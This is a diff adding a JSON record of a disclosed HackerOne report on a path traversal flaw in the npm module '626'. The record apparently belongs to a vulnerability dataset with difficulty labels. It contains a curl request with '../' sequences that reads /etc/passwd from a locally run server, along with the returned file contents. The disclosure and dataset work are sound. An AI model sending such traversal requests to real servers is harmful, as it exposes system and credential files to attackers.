@@ -1,0 +1,42 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "bl4de ",
+  "title": "[626] Path Traversal allows to read arbitrary file from remote server",
+  "content": "\nHi Guys,\nThere is Path Traversal vulnerability in 626 module, which allows to read arbitrary file from the remote server.\nModule\n626\nThis package exposes a directory and its children to create, read, update, and delete operations over http.\nhttps://www.npmjs.com/package/626\nversion: 1.1.1\nStats\n0 downloads in the last day\n19 downloads in the last week\n103 downloads in the last month\n~1200 estimated downloads per year\nDescription\nThis vulnerability exists, because there is no sanitization of path of requested file:\nCode 284 Bytes\n1// node_modules/626/index.js, line 15:\n2\n3    var url = resolveUrl(req.url);\n4    var file = path.resolve(url);\n5    log(url + ': ' + file);\n6\n7    fs.readFile(file, 'utf8', function (err, content) {\n8        if (err) {\n9            return res.end('error: file not found ' + file);\n10        }\n11\nSteps To Reproduce:\ninstall 626 module\nCode 17 Bytes\n1$ npm install 626\nrun server from command line:\nCode 47 Bytes\n1$ ./node_modules/626/index.js\n2Listening on 8080\nuse following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):\nCode 67 Bytes\n1$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd\nResult:\nCode 776 Bytes\n1$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd\n2*   Trying 192.168.1.1...\n3* TCP_NODELAY set\n4* Connected to 192.168.1.1 (192.168.1.1) port 8080 (#0)\n5> GET /../../../../../etc/passwd HTTP/1.1\n6> Host: 192.168.1.1:8080\n7> User-Agent: curl/7.54.0\n8> Accept: */*\n9>\n10< HTTP/1.1 200 OK\n11< Date: Wed, 31 Jan 2018 22:51:06 GMT\n12< Connection: keep-alive\n13< Content-Length: 6774\n14<\n15##\n16# User Database\n17#\n18# Note that this file is consulted directly only when the system is running\n19# in single-user mode.  At other times this information is provided by\n20# Open Directory.\n21#\n22# See the opendirectoryd(8) man page for additional information about\n23# Open Directory.\n24##\n25nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\n26root:*:0:0:System Administrator:/var/root:/bin/sh\n27(...)\nSupporting Material/References:\nConfiguration:\nmacOS 10.13.3\nChromium 66.0.3331.0 (Developer Build) (64-bit)\nNode.js version: v8.9.3\nnpm version: 5.5.1\ncurl 7.54.0\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability allows to read content of any file on the remote server where 626 is run.\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1519698600,
+  "report_url": "https://hackerone.com/reports/311216",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the 626 module using npm: `npm install 626`"
+    ],
+    [
+      2,
+      "Run the server from the command line: `./node_modules/626/index.js`"
+    ],
+    [
+      3,
+      "Use curl to exploit the path traversal vulnerability: `curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd`"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Path Traversal issue in the 626 module, which allows an attacker to read arbitrary files from the remote server due to lack of sanitization of the file path in the request. The module directly resolves and reads the file path provided in the URL without any checks, enabling access to sensitive files like /etc/passwd.",
+  "reason": "The vulnerability is straightforward to discover as it involves a common and well-known attack pattern (Path Traversal) and does not require complex interactions or state manipulations. The attack is direct and the steps to reproduce are simple and clear.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
